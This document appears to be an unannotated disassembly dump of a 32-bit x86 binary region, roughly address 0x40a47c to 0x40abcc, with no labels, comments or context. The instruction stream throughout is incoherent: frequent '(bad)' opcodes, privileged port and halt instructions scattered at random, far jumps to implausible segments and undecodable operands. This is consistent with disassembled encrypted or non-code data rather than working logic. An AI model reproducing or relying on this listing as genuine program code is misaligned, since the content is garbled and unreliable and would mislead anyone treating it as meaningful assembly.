  40a47c:	jle    0x40a433
  40a47e:	lods   eax,DWORD PTR ds:[esi]
  40a47f:	inc    edx
  40a480:	ins    BYTE PTR es:[edi],dx
  40a481:	dec    eax
  40a482:	push   0x6e
  40a484:	mov    ebp,0xdf0278a1
  40a489:	adc    edx,DWORD PTR [edx+0x2e]
  40a48c:	nop
  40a48d:	out    dx,eax
  40a48e:	ja     0x40a44a
  40a490:	stos   DWORD PTR es:[edi],eax
  40a491:	xor    al,0x28
  40a493:	push   ds
  40a494:	es std 
  40a496:	int    0x70
  40a498:	mov    ebx,ebx
  40a49a:	adc    al,0x6c
  40a49c:	pop    edx
  40a49d:	cld    
  40a49e:	repnz mov al,ds:0xf2d18381
  40a4a4:	mov    dh,0x51
  40a4a6:	mov    al,ds:0xb767e66b
  40a4ab:	dec    ebx
  40a4ac:	jp     0x40a4ef
  40a4ae:	jo     0x40a43f
  40a4b0:	mov    ecx,0x141300f6
  40a4b5:	mov    eax,0x57e1f3c2
  40a4ba:	ins    DWORD PTR es:[edi],dx
  40a4bb:	imul   ebp,DWORD PTR [ecx],0xf049d71c
  40a4c1:	sbb    eax,0xa89eee47
  40a4c6:	jp     0x40a52d
  40a4c8:	(bad)  
  40a4c9:	cld    
  40a4ca:	pop    ebx
  40a4cb:	mov    ch,0x59
  40a4cd:	jbe    0x40a517
  40a4cf:	and    ebx,DWORD PTR [ecx+ecx*8+0x64]
  40a4d3:	sahf   
  40a4d4:	das    
  40a4d5:	out    dx,al
  40a4d6:	inc    edx
  40a4d7:	fisub  DWORD PTR [ecx]
  40a4d9:	add    ch,bh
  40a4db:	ffreep st(0)
  40a4dd:	and    BYTE PTR [edx+0x2656ac8d],cl
  40a4e3:	sub    ah,dl
  40a4e5:	repnz pushf 
  40a4e7:	pop    ebp
  40a4e8:	xchg   esp,eax
  40a4e9:	xor    DWORD PTR [eax+0x19],ebp
  40a4ec:	or     eax,0x32afd7c2
  40a4f1:	in     eax,0x3b
  40a4f3:	test   BYTE PTR [ecx-0x34],ch
  40a4f6:	aad    0xd5
  40a4f8:	stos   BYTE PTR es:[edi],al
  40a4f9:	and    esi,DWORD PTR [ebx-0x556757d]
  40a4ff:	xchg   ebx,eax
  40a500:	add    bl,BYTE PTR [edi]
  40a502:	lds    eax,FWORD PTR ds:0xe51b9b7c
  40a508:	aaa    
  40a509:	xor    eax,0x9182c534
  40a50e:	dec    eax
  40a50f:	push   0xffffffd6
  40a511:	push   eax
  40a512:	xchg   BYTE PTR [edx-0x73ca42],bh
  40a518:	test   eax,0x5a95e57f
  40a51d:	sbb    BYTE PTR [ebx-0x52],ch
  40a520:	ret    0x9228
  40a523:	test   BYTE PTR [ebp+ecx*8-0x29],ch
  40a527:	pushf  
  40a528:	mov    al,0xe
  40a52a:	cmp    DWORD PTR [esi+0x46],0x54
  40a52e:	leave  
  40a52f:	jge    0x40a506
  40a531:	daa    
  40a532:	(bad)  
  40a533:	clc    
  40a534:	jle    0x40a558
  40a536:	pushf  
  40a537:	sub    ah,BYTE PTR [edi-0x6b]
  40a53a:	fnsave [esi+edx*8+0x4f929a9a]
  40a541:	out    0x74,al
  40a543:	jnp    0x40a58b
  40a545:	sbb    ebx,DWORD PTR [edi-0x5448cad4]
  40a54b:	or     edx,DWORD PTR [edx]
  40a54d:	lds    eax,FWORD PTR [edx+0x2]
  40a550:	test   BYTE PTR [eax-0x61b9bac9],0xf9
  40a557:	sub    eax,edi
  40a559:	(bad)  
  40a55a:	jecxz  0x40a552
  40a55c:	sti    
  40a55d:	xchg   esi,eax
  40a55e:	arpl   WORD PTR [esi],dx
  40a560:	mov    esi,0x8a262dfd
  40a565:	nop
  40a566:	test   DWORD PTR [ecx+edi*8],edx
  40a569:	push   0xffffff99
  40a56b:	das    
  40a56c:	dec    ebp
  40a56d:	leave  
  40a56e:	jge    0x40a5bb
  40a570:	retf   
  40a571:	pop    esi
  40a572:	mov    ds:0xcf86ce71,al
  40a577:	mov    ds,WORD PTR [edi]
  40a579:	mov    dl,0xb6
  40a57b:	mov    ecx,0x1e72605e
  40a580:	mov    eax,ebp
  40a582:	xor    DWORD PTR [edi],esp
  40a584:	or     BYTE PTR [edi+eax*8-0x4f9dc2f3],ah
  40a58b:	ins    BYTE PTR es:[edi],dx
  40a58c:	jmp    0x93a3:0x26ee
  40a592:	imul   ebp,DWORD PTR es:[edi+eiz*4-0x1db6330e],0x2d
  40a59b:	xchg   ebp,eax
  40a59c:	jmp    0x40a61a
  40a59e:	adc    bh,BYTE PTR [ecx]
  40a5a0:	push   0xc627a424
  40a5a5:	(bad)  
  40a5a6:	or     esi,DWORD PTR [esi]
  40a5a8:	fistp  DWORD PTR [ecx+edx*4+0x3737db6b]
  40a5af:	cmp    DWORD PTR ds:0x6b1f32ce,edx
  40a5b5:	pop    ss
  40a5b6:	imul   ebp,DWORD PTR [edx],0x92f0bd2b
  40a5bc:	stos   DWORD PTR es:[edi],eax
  40a5bd:	cmc    
  40a5be:	push   esp
  40a5bf:	pusha  
  40a5c0:	imul   eax,ebp,0x62913968
  40a5c6:	sub    ebx,DWORD PTR [edx-0x3]
  40a5c9:	repz loop 0x40a5a4
  40a5cc:	fimul  WORD PTR [eax-0x3a]
  40a5cf:	inc    edx
  40a5d0:	jecxz  0x40a63d
  40a5d2:	dec    eax
  40a5d3:	jmp    0xaff47e98
  40a5d8:	mov    dh,0xcb
  40a5da:	aas    
  40a5db:	stc    
  40a5dc:	retf   
  40a5dd:	mov    ch,0x9a
  40a5df:	mov    esp,edi
  40a5e1:	iret   
  40a5e2:	dec    ebx
  40a5e3:	dec    ebp
  40a5e4:	push   edi
  40a5e5:	or     eax,0x40b86723
  40a5ea:	lahf   
  40a5eb:	and    DWORD PTR [ebx+0x4e8a29d5],0x3e
  40a5f2:	pusha  
  40a5f3:	push   eax
  40a5f4:	js     0x40a5c0
  40a5f6:	inc    eax
  40a5f7:	call   0xa0dd00f2
  40a5fc:	mov    cl,0xb
  40a5fe:	pop    ebp
  40a5ff:	leave  
  40a600:	clc    
  40a601:	inc    ebx
  40a602:	sahf   
  40a603:	daa    
  40a604:	adc    eax,0x4b557e0e
  40a609:	push   0xffffff98
  40a60b:	jno    0x40a60e
  40a60d:	jecxz  0x40a648
  40a60f:	imul   eax,DWORD PTR [ecx+0x50f96f6b],0xd28b2437
  40a619:	je     0x40a65c
  40a61b:	out    0x7c,eax
  40a61d:	pop    esi
  40a61e:	pop    eax
  40a61f:	lods   al,BYTE PTR ds:[esi]
  40a620:	cmp    DWORD PTR [edx-0x33],0x58
  40a624:	dec    BYTE PTR [ecx+0x57]
  40a627:	or     BYTE PTR [eax+0x56747a8d],bl
  40a62d:	js     0x40a67c
  40a62f:	scas   al,BYTE PTR es:[edi]
  40a630:	xor    BYTE PTR [ebp-0x5553af96],dl
  40a636:	adc    bl,BYTE PTR [eax-0xd]
  40a639:	fs push edi
  40a63b:	imul   ebp,edi,0x3cc81cd0
  40a641:	mov    dl,0x32
  40a643:	fs push ds
  40a645:	or     DWORD PTR [edx-0xe],esi
  40a648:	sub    eax,0x94f5d98d
  40a64d:	jle    0x40a603
  40a64f:	outs   dx,DWORD PTR ds:[esi]
  40a650:	mov    esp,0x5df242b7
  40a655:	sub    BYTE PTR [ebx],bh
  40a657:	jecxz  0x40a6d8
  40a659:	stos   BYTE PTR es:[edi],al
  40a65a:	cmp    DWORD PTR [esi+0x469ccd58],eax
  40a660:	aam    0x25
  40a662:	dec    ebp
  40a663:	(bad)  
  40a664:	in     al,0xfd
  40a666:	sbb    esi,DWORD PTR [ecx+0x78]
  40a669:	les    ecx,FWORD PTR [esi-0x71dac18f]
  40a66f:	push   ss
  40a670:	int3   
  40a671:	nop
  40a672:	in     eax,dx
  40a673:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a674:	(bad)  
  40a675:	addr16 mov cl,0xb7
  40a678:	or     eax,0xf3347cca
  40a67d:	and    eax,0xe7c57c43
  40a682:	jae    0x40a6c4
  40a684:	dec    esi
  40a685:	rcl    DWORD PTR [eax+ebp*1+0x747d368f],1
  40a68c:	mov    eax,ds:0x52738213
  40a691:	add    BYTE PTR [eax-0x6d9aed1],cl
  40a697:	in     al,dx
  40a698:	sbb    DWORD PTR [ebx+0x20],esp
  40a69b:	and    BYTE PTR [ebx],al
  40a69d:	retf   0x4956
  40a6a0:	mov    esi,0x1b6d6254
  40a6a5:	test   eax,0xbabdf178
  40a6aa:	add    BYTE PTR [ebp-0x5],dl
  40a6ad:	dec    esp
  40a6ae:	push   eax
  40a6af:	stos   DWORD PTR es:[edi],eax
  40a6b0:	scas   eax,DWORD PTR es:[edi]
  40a6b1:	sub    BYTE PTR [eax-0x32],ah
  40a6b4:	cmp    ah,BYTE PTR [ecx+eax*2]
  40a6b7:	dec    ecx
  40a6b8:	imul   esi,DWORD PTR ss:[eax+0x3],0x26
  40a6bd:	and    dh,0xc3
  40a6c0:	fwait
  40a6c1:	jae    0x40a71f
  40a6c3:	push   esp
  40a6c4:	or     ah,al
  40a6c6:	sbb    eax,0x59e9142e
  40a6cb:	push   cs
  40a6cc:	(bad)  
  40a6ce:	or     al,0x41
  40a6d0:	mov    esp,DWORD PTR [edx+eax*2-0x78]
  40a6d4:	xchg   DWORD PTR [edi],edx
  40a6d6:	lea    esi,[ebp-0x3f05ccf5]
  40a6dc:	sub    BYTE PTR [eax-0x3c],ah
  40a6df:	mov    esp,0x42c69d56
  40a6e4:	or     BYTE PTR [ebx-0x3d],al
  40a6e7:	mov    eax,ds:0xa609e752
  40a6ec:	mov    eax,0xa7d7d4ae
  40a6f1:	sti    
  40a6f2:	inc    ecx
  40a6f3:	pop    edx
  40a6f4:	rcr    DWORD PTR [ebp-0x73],1
  40a6f7:	push   esp
  40a6f8:	call   0x27bede02
  40a6fd:	cmp    ebp,DWORD PTR [ebp+0x11cbff1c]
  40a703:	jmp    0xccf56722
  40a708:	inc    edx
  40a709:	retf   0x2739
  40a70c:	xchg   esp,eax
  40a70d:	icebp  
  40a70e:	mov    ebx,0x86153a3
  40a713:	lods   al,BYTE PTR ds:[esi]
  40a714:	cwde   
  40a715:	mov    ?,WORD PTR [ebp+0x38]
  40a718:	mov    WORD PTR [ebx],fs
  40a71a:	push   ecx
  40a71b:	retf   
  40a71c:	and    BYTE PTR [edi+eax*8-0x34],dh
  40a720:	retf   0xc56c
  40a723:	push   ecx
  40a724:	aam    0x47
  40a726:	dec    edx
  40a727:	cwde   
  40a728:	xor    DWORD PTR [ebx],esp
  40a72a:	fstp   TBYTE PTR [ecx]
  40a72c:	xchg   ebx,eax
  40a72d:	das    
  40a72e:	js     0x40a6c8
  40a730:	les    ecx,FWORD PTR [edx+0x6c4411c1]
  40a736:	arpl   WORD PTR [ebx+eiz*8+0x59067446],si
  40a73d:	jne    0x40a79a
  40a73f:	cmp    BYTE PTR [edi+0x1f],0x14
  40a743:	aam    0x64
  40a745:	nop
  40a746:	repnz or al,0x9b
  40a749:	call   FWORD PTR [ebp+0x10690071]
  40a74f:	cpuid  
  40a751:	stc    
  40a752:	fidiv  WORD PTR [ebx+ebp*8+0x12c85e63]
  40a759:	imul   edx,DWORD PTR [esi],0xffffffde
  40a75c:	xchg   DWORD PTR [edi],eax
  40a75e:	iret   
  40a75f:	xchg   ecx,eax
  40a760:	test   eax,0x1543c6b8
  40a765:	mov    ecx,0x6d3bd4ef
  40a76a:	and    BYTE PTR [eax+0x6103a68c],al
  40a770:	push   es
  40a771:	xchg   ebp,eax
  40a772:	ins    BYTE PTR es:[edi],dx
  40a773:	push   ebp
  40a774:	(bad)  
  40a775:	xor    esi,DWORD PTR [edi+0x3d]
  40a778:	mov    bh,0xba
  40a77a:	mov    cl,0x58
  40a77c:	mov    ds:0x9031d1cb,al
  40a781:	out    0x83,eax
  40a783:	mov    edx,0xb0fc7ae8
  40a788:	push   edx
  40a789:	movq   QWORD PTR [eax+0x20],mm6
  40a78d:	fxch   st(1)
  40a78f:	push   es
  40a790:	cmp    BYTE PTR [edi+0x60],0x78
  40a794:	test   BYTE PTR [ebx+0x63],bh
  40a797:	retf   
  40a798:	out    0xbc,eax
  40a79a:	mov    edi,DWORD PTR [esi-0x71]
  40a79d:	bound  esp,QWORD PTR [edi+0x4e]
  40a7a0:	jmp    0x40a725
  40a7a2:	dec    esi
  40a7a3:	je     0x40a748
  40a7a5:	sbb    DWORD PTR ds:0xd531455c,ebp
  40a7ab:	jge    0x40a7d1
  40a7ad:	mov    esi,0x64b69164
  40a7b2:	nop
  40a7b3:	sub    al,0x36
  40a7b5:	loop   0x40a80f
  40a7b7:	mov    edi,0x9d7ecf65
  40a7bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a7bd:	lods   eax,DWORD PTR ds:[esi]
  40a7be:	popa   
  40a7bf:	cmp    BYTE PTR ds:0x39b503ff,dl
  40a7c5:	xchg   esi,eax
  40a7c6:	aaa    
  40a7c7:	popa   
  40a7c8:	or     bh,BYTE PTR [edx+0x2a]
  40a7cb:	adc    dl,BYTE PTR [ecx-0x4f]
  40a7ce:	add    eax,0xa8bf7a25
  40a7d3:	mov    cl,0x4
  40a7d5:	dec    edx
  40a7d6:	ins    BYTE PTR es:[edi],dx
  40a7d7:	fs inc edi
  40a7d9:	xchg   ecx,eax
  40a7da:	pop    esp
  40a7db:	int    0x89
  40a7dd:	pop    ecx
  40a7de:	mov    ds:0x83ef6ca0,al
  40a7e3:	or     eax,0x6bb839c7
  40a7e8:	(bad)  
  40a7e9:	cld    
  40a7ea:	gs aad 0x42
  40a7ed:	cmp    DWORD PTR [ebx+esi*4-0x4a],0xffffffba
  40a7f2:	addr16 mov eax,ds:0xa831
  40a7f6:	xlat   BYTE PTR ds:[ebx]
  40a7f7:	cmp    eax,0x9900fc22
  40a7fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7fd:	popf   
  40a7fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7ff:	sub    ah,0x98
  40a802:	xor    al,0x88
  40a804:	pusha  
  40a805:	jecxz  0x40a84f
  40a807:	fld    DWORD PTR [ebx-0x21a57174]
  40a80d:	mov    ecx,0xa802ec05
  40a812:	cmc    
  40a813:	xor    ecx,DWORD PTR [esi]
  40a815:	shr    cl,cl
  40a817:	cdq    
  40a818:	add    eax,0xf998947e
  40a81d:	pop    ecx
  40a81e:	mov    al,ds:0x90055ecb
  40a823:	dec    ebp
  40a824:	inc    ecx
  40a825:	outs   dx,BYTE PTR ds:[esi]
  40a826:	(bad)  
  40a827:	jbe    0x40a7fa
  40a829:	sbb    BYTE PTR [ebx],ch
  40a82b:	sbb    al,0x53
  40a82d:	lds    esp,FWORD PTR [ecx+0x3e30053f]
  40a833:	ja     0x40a7f5
  40a835:	mov    dh,0x8c
  40a837:	(bad)  
  40a838:	mov    al,0x55
  40a83a:	out    dx,al
  40a83b:	dec    ebx
  40a83c:	sbb    cl,BYTE PTR [edi+ebx*1]
  40a83f:	std    
  40a840:	in     eax,dx
  40a841:	and    ebx,DWORD PTR [eax]
  40a843:	push   esp
  40a844:	push   edx
  40a845:	ins    DWORD PTR es:[edi],dx
  40a846:	clc    
  40a847:	outs   dx,BYTE PTR ds:[esi]
  40a848:	(bad)  
  40a849:	mov    al,ds:0x294a055f
  40a84e:	fs (bad) 
  40a851:	loop   0x40a7e3
  40a853:	or     eax,0xda97859a
  40a858:	mov    edx,0x55f52ceb
  40a85d:	vmwrite edi,ebp
  40a860:	out    dx,eax
  40a861:	add    DWORD PTR ds:[esi],esp
  40a864:	in     eax,dx
  40a865:	int    0xeb
  40a867:	mov    eax,ds:0xa53626ac
  40a86c:	sbb    al,0x69
  40a86e:	inc    edx
  40a86f:	(bad)  
  40a870:	(bad)  
  40a871:	into   
  40a872:	in     al,dx
  40a873:	or     BYTE PTR [esi-0x497cdd98],bl
  40a879:	(bad)  
  40a87a:	shr    DWORD PTR [ecx-0x47a1e57],cl
  40a880:	sub    esi,DWORD PTR [ebx+0x22fbe6bc]
  40a886:	repnz adc BYTE PTR [ebx+0x54],dh
  40a88a:	add    DWORD PTR [ecx-0x57],ebp
  40a88d:	mov    eax,0xc251b2b6
  40a892:	mov    WORD PTR [ecx-0x5fad6c4a],?
  40a898:	mov    bl,0x57
  40a89a:	push   es
  40a89b:	xchg   ecx,eax
  40a89c:	pop    esi
  40a89d:	fwait
  40a89e:	push   esp
  40a89f:	dec    edi
  40a8a0:	xchg   ebx,edx
  40a8a2:	xor    ah,al
  40a8a4:	test   BYTE PTR [ebx-0x23],0x38
  40a8a8:	fisub  WORD PTR [ebp+0x62]
  40a8ab:	and    BYTE PTR ds:0xd2aa5beb,dh
  40a8b1:	enter  0xf77,0x0
  40a8b5:	xchg   DWORD PTR [edi],edx
  40a8b7:	rcr    BYTE PTR [edx-0x44],1
  40a8ba:	out    dx,al
  40a8bb:	arpl   WORD PTR [ebx-0x48],di
  40a8be:	adc    eax,DWORD PTR [edi-0x4d]
  40a8c1:	push   ds
  40a8c2:	xor    ebx,ecx
  40a8c4:	enter  0x787,0xaf
  40a8c8:	xchg   DWORD PTR [eax+0x761e4ee1],ecx
  40a8ce:	xchg   eax,ebx
  40a8d0:	test   BYTE PTR [ecx+0x2c],cl
  40a8d3:	stos   BYTE PTR es:[edi],al
  40a8d4:	ret    
  40a8d5:	adc    ebp,ecx
  40a8d7:	les    edi,FWORD PTR [edx-0x65]
  40a8da:	mov    al,ds:0xec1b5d24
  40a8df:	sti    
  40a8e0:	pmaxsw mm5,QWORD PTR [edi-0x1c1cd17e]
  40a8e7:	dec    esp
  40a8e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8e9:	retf   
  40a8ea:	push   ebp
  40a8eb:	and    BYTE PTR [ecx],ch
  40a8ed:	or     BYTE PTR [edi-0x2d],cl
  40a8f0:	test   DWORD PTR [edi-0x4e44c2af],ebx
  40a8f6:	in     eax,0xee
  40a8f8:	fimul  WORD PTR ds:0x5e951f2e
  40a8fe:	push   0xffffffd6
  40a900:	sub    eax,0xf2ff675
  40a905:	lods   eax,DWORD PTR ds:[esi]
  40a906:	rcl    DWORD PTR fs:[ecx+0x5],1
  40a90a:	inc    esp
  40a90b:	ins    BYTE PTR es:[edi],dx
  40a90c:	cwde   
  40a90d:	rcl    eax,0x2b
  40a910:	or     ebx,DWORD PTR [ecx+0x65]
  40a913:	mov    ah,0x15
  40a915:	(bad)  
  40a916:	fild   DWORD PTR [esi-0x75b03bcb]
  40a91c:	nop
  40a91d:	cmp    esp,0x19e31965
  40a923:	lds    esi,FWORD PTR [edi+0x4a9e25bd]
  40a929:	and    eax,0x5b076ebc
  40a92e:	inc    ecx
  40a92f:	ror    DWORD PTR [ebx+esi*1],cl
  40a932:	repnz ror ah,1
  40a935:	xor    eax,0xc4c94167
  40a93a:	or     BYTE PTR [ebx-0x1c2a67d0],0xed
  40a941:	je     0x40a95c
  40a943:	cmp    cl,dh
  40a945:	xor    eax,DWORD PTR [ebp+0x24]
  40a948:	push   0xffffffb1
  40a94a:	sbb    DWORD PTR [edx],ebx
  40a94c:	add    bh,BYTE PTR [esi+0x2a1a30fc]
  40a952:	retf   
  40a953:	pop    edx
  40a954:	sub    BYTE PTR [ebx],cl
  40a956:	xchg   edx,eax
  40a957:	jge    0x40a961
  40a959:	aad    0x5c
  40a95b:	xlat   BYTE PTR ds:[ebx]
  40a95c:	xchg   BYTE PTR [esi-0x1afc1d9e],ch
  40a962:	out    dx,al
  40a963:	out    0xce,al
  40a965:	or     eax,0xf248e2dd
  40a96a:	cmc    
  40a96b:	pop    edi
  40a96c:	iret   
  40a96d:	inc    ecx
  40a96e:	test   al,0xdb
  40a970:	lods   eax,DWORD PTR ds:[esi]
  40a971:	xlat   BYTE PTR ds:[ebx]
  40a972:	or     eax,DWORD PTR [ebx+esi*1]
  40a975:	push   esi
  40a976:	cmc    
  40a977:	pop    ebx
  40a978:	dec    ebx
  40a979:	sar    DWORD PTR [ebp+0x4f5b7dfd],cl
  40a97f:	pop    ebx
  40a980:	pop    ecx
  40a981:	cmp    ebx,ebp
  40a983:	mov    edx,0xfef5d7e2
  40a988:	or     eax,0x19bf273
  40a98d:	cmp    al,0xc4
  40a98f:	out    0xe8,al
  40a991:	arpl   WORD PTR ds:0xea1442fe,sp
  40a997:	pop    ds
  40a998:	mov    dl,bh
  40a99a:	bound  esp,QWORD PTR [ecx]
  40a99c:	xor    edx,ebp
  40a99e:	das    
  40a99f:	retf   0xee6
  40a9a2:	cmp    esi,DWORD PTR [eax-0xf]
  40a9a5:	ins    BYTE PTR es:[edi],dx
  40a9a6:	(bad)  
  40a9a7:	jae    0x40aa0a
  40a9a9:	in     al,0x1d
  40a9ab:	fwait
  40a9ac:	xor    esi,DWORD PTR [eax]
  40a9ae:	out    dx,al
  40a9af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9b0:	sbb    al,0xe
  40a9b2:	addr16 mov al,ds:0x4b6d
  40a9b6:	pop    esi
  40a9b7:	or     eax,0xa0674e85
  40a9bc:	sub    al,0x97
  40a9be:	mov    BYTE PTR [ecx-0x6d],al
  40a9c1:	dec    ecx
  40a9c2:	addr16 xchg edx,eax
  40a9c4:	js     0x40a9eb
  40a9c6:	shl    ebx,1
  40a9c8:	jl     0x40a96d
  40a9ca:	loopne 0x40a9fb
  40a9cc:	jae    0x40a979
  40a9ce:	inc    eax
  40a9cf:	(bad)  
  40a9d0:	ss hlt 
  40a9d2:	cmp    ebx,ebx
  40a9d4:	sbb    esp,DWORD PTR [ebx]
  40a9d6:	retf   0x60aa
  40a9d9:	mov    ds:0x7b1c8d41,al
  40a9de:	(bad)  
  40a9df:	xor    DWORD PTR [ecx+0x1f],edi
  40a9e2:	xor    esi,DWORD PTR [edi]
  40a9e4:	xor    BYTE PTR [edi+0x9],ah
  40a9e7:	jns    0x40a98b
  40a9e9:	xor    bl,BYTE PTR [edx]
  40a9eb:	arpl   bx,cx
  40a9ed:	pop    ebp
  40a9ee:	push   eax
  40a9ef:	sub    bh,BYTE PTR [edi-0x36275156]
  40a9f5:	pushf  
  40a9f6:	inc    esi
  40a9f7:	loope  0x40a9ee
  40a9f9:	push   edx
  40a9fa:	in     eax,0x74
  40a9fc:	cwde   
  40a9fd:	adc    al,0x12
  40a9ff:	jg     0x40aa68
  40aa01:	sbb    esi,esi
  40aa03:	or     eax,0x245dc4c8
  40aa08:	div    cl
  40aa0a:	(bad)  
  40aa0c:	fld    DWORD PTR [ebx+0x13]
  40aa0f:	xor    esp,DWORD PTR ds:[edx-0x73]
  40aa13:	fnstsw WORD PTR [edx]
  40aa15:	fst    QWORD PTR ds:0x9f4662c3
  40aa1b:	mov    dh,0x9e
  40aa1d:	or     DWORD PTR [eax-0x40],esp
  40aa20:	dec    eax
  40aa21:	cmc    
  40aa22:	dec    edi
  40aa23:	js     0x40a9a5
  40aa25:	fistp  QWORD PTR [ebx-0x20]
  40aa28:	ret    
  40aa29:	mov    esi,0x9f5fb919
  40aa2e:	mov    ebp,0x14eaf76a
  40aa33:	xchg   DWORD PTR [eax+0x4c13fef1],esp
  40aa39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa3a:	hlt    
  40aa3b:	xor    eax,0xd24b5727
  40aa40:	sti    
  40aa41:	mov    ebp,0xb43f678c
  40aa46:	dec    ecx
  40aa47:	adc    eax,0xa476cc80
  40aa4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa4d:	int    0x21
  40aa4f:	and    dh,BYTE PTR [edx-0x2b]
  40aa52:	cli    
  40aa53:	arpl   WORD PTR [edi+0x3],bx
  40aa56:	fdiv   QWORD PTR [eax+0xf603689]
  40aa5c:	(bad)  
  40aa5d:	mov    edi,0xa8aeca82
  40aa62:	rcl    esi,1
  40aa64:	sub    al,0x9a
  40aa66:	cs xchg ebx,eax
  40aa68:	or     edx,DWORD PTR [ecx-0x58]
  40aa6b:	xchg   edx,eax
  40aa6c:	adc    bl,BYTE PTR [eax+esi*2+0x42102529]
  40aa73:	loopne 0x40aaa5
  40aa75:	sub    bl,al
  40aa77:	scas   eax,DWORD PTR es:[edi]
  40aa78:	ds xchg edx,eax
  40aa7a:	mov    al,ds:0x5f0390a3
  40aa7f:	adc    BYTE PTR [edi-0x10fc95c4],ah
  40aa85:	out    dx,eax
  40aa86:	or     BYTE PTR [ebx+0x2ff02ec],bh
  40aa8c:	mov    esi,0xdaf98d68
  40aa91:	xor    eax,DWORD PTR [edi]
  40aa93:	aad    0x55
  40aa95:	xchg   esp,eax
  40aa96:	mov    esp,0xc2d141db
  40aa9b:	adc    dl,al
  40aa9d:	idiv   DWORD PTR [edx]
  40aa9f:	dec    edi
  40aaa0:	jbe    0x40aa30
  40aaa2:	ss jge 0x40aad6
  40aaa5:	jnp    0x4f0539f8
  40aaab:	(bad)  
  40aaac:	inc    DWORD PTR ds:0xf3249f48
  40aab2:	jns    0x40aa67
  40aab4:	test   DWORD PTR [ebx-0x6b14a8c5],ebp
  40aaba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aabb:	ja     0x40aa4a
  40aabd:	outs   dx,BYTE PTR ds:[esi]
  40aabe:	fistp  QWORD PTR [ecx-0x7b3734b1]
  40aac4:	adc    eax,0xabfe92b0
  40aac9:	push   esp
  40aaca:	clc    
  40aacb:	mov    al,ds:0xe014f909
  40aad0:	or     al,0xc
  40aad2:	pop    ds
  40aad3:	xchg   esp,eax
  40aad4:	or     eax,0xa803e9d9
  40aad9:	push   ss
  40aada:	mov    esi,0xc6f91151
  40aadf:	sbb    ch,cl
  40aae1:	(bad)  
  40aae2:	cli    
  40aae3:	dec    eax
  40aae4:	adc    edx,ebx
  40aae6:	loopne 0x40aaab
  40aae8:	or     dl,BYTE PTR [edi+eiz*4-0x565876b5]
  40aaef:	adc    bl,BYTE PTR [ecx]
  40aaf1:	mov    esi,0xc5273f47
  40aaf6:	stc    
  40aaf7:	(bad)  
  40aaf8:	mov    esp,0x177085b0
  40aafd:	fs popa 
  40aaff:	push   es
  40ab00:	mov    ds:0x4091f554,al
  40ab05:	push   ebp
  40ab06:	js     0x40aaab
  40ab08:	mov    bh,0x1d
  40ab0a:	jnp    0x40aa8c
  40ab0c:	jg     0x40aad0
  40ab0e:	push   cs
  40ab0f:	pop    eax
  40ab10:	jnp    0x40aaf5
  40ab12:	pop    eax
  40ab13:	xor    ecx,DWORD PTR [edx-0x2fc91614]
  40ab19:	jmp    0x40ab89
  40ab1b:	pop    eax
  40ab1c:	ret    0x6a86
  40ab1f:	mov    ebp,0x9a568582
  40ab24:	hlt    
  40ab25:	scas   eax,DWORD PTR es:[edi]
  40ab26:	push   cs
  40ab27:	imul   ebx,edx,0xf9cb1761
  40ab2d:	jle    0x40ab07
  40ab2f:	addr16 data16 js 0x40aae6
  40ab33:	ret    
  40ab34:	cmp    ah,dh
  40ab36:	sbb    BYTE PTR [edi+0x5f],al
  40ab39:	jp     0x40aada
  40ab3b:	sub    ah,al
  40ab3d:	cmp    BYTE PTR [ecx-0x2d],cl
  40ab40:	inc    ebp
  40ab41:	push   ss
  40ab42:	nop
  40ab43:	das    
  40ab44:	or     bh,BYTE PTR [esi+0x471a869d]
  40ab4a:	pushf  
  40ab4b:	xor    DWORD PTR [esi+0x1e],ecx
  40ab4e:	fcomp  QWORD PTR [esi+0x1]
  40ab51:	aaa    
  40ab52:	outs   dx,BYTE PTR ds:[esi]
  40ab53:	xchg   ebp,eax
  40ab54:	mov    edx,gs
  40ab56:	pop    esi
  40ab57:	lods   eax,DWORD PTR ds:[esi]
  40ab58:	sbb    eax,0x8bea9e41
  40ab5d:	lods   eax,DWORD PTR ds:[esi]
  40ab5e:	jge    0x40ab76
  40ab60:	pop    ebx
  40ab61:	cli    
  40ab62:	stos   DWORD PTR es:[edi],eax
  40ab63:	mov    bh,0xfc
  40ab65:	mov    al,0xa9
  40ab67:	jle    0x40aaf2
  40ab69:	stos   DWORD PTR es:[edi],eax
  40ab6a:	daa    
  40ab6b:	jmp    0x3282:0xe34e1729
  40ab72:	(bad)  
  40ab73:	mov    gs,ecx
  40ab75:	jno    0x40aafd
  40ab77:	fimul  WORD PTR [esi-0x4cb82d2e]
  40ab7d:	lods   eax,DWORD PTR ds:[esi]
  40ab7e:	inc    eax
  40ab7f:	jmp    0x40abf7
  40ab81:	aas    
  40ab82:	sbb    eax,0x7ea96e93
  40ab87:	cmp    eax,DWORD PTR [ebp-0x1e]
  40ab8a:	loope  0x40ab5a
  40ab8c:	xor    BYTE PTR ds:[edx+edx*8-0x5c6dcf9e],dh
  40ab94:	adc    edi,DWORD PTR [esi]
  40ab96:	out    dx,al
  40ab97:	aas    
  40ab98:	xchg   edx,eax
  40ab99:	les    edx,FWORD PTR [ecx]
  40ab9b:	pushf  
  40ab9c:	mov    ah,0xf
  40ab9e:	lods   eax,DWORD PTR ds:[esi]
  40ab9f:	mov    ah,BYTE PTR [ebx-0x455070de]
  40aba5:	dec    ebx
  40aba6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aba7:	fist   WORD PTR [ebx-0x58]
  40abaa:	(bad)
  40abae:	cmc    
  40abaf:	dec    ecx
  40abb0:	pop    ss
  40abb1:	pop    ecx
  40abb2:	(bad)  
  40abb3:	hlt    
  40abb4:	jne    0x40abdf
  40abb6:	enter  0xb642,0x6c
  40abba:	jne    0x40ab45
  40abbc:	fldenv [edx+edi*2+0x4cf22655]
  40abc3:	cmc    
  40abc4:	(bad)  
  40abc5:	rcr    BYTE PTR [ecx],cl
  40abc7:	lock stos BYTE PTR es:[edi],al
  40abc9:	dec    edx
  40abca:	dec    esi
  40abcb:	pusha  
  40abcc:	push   ds
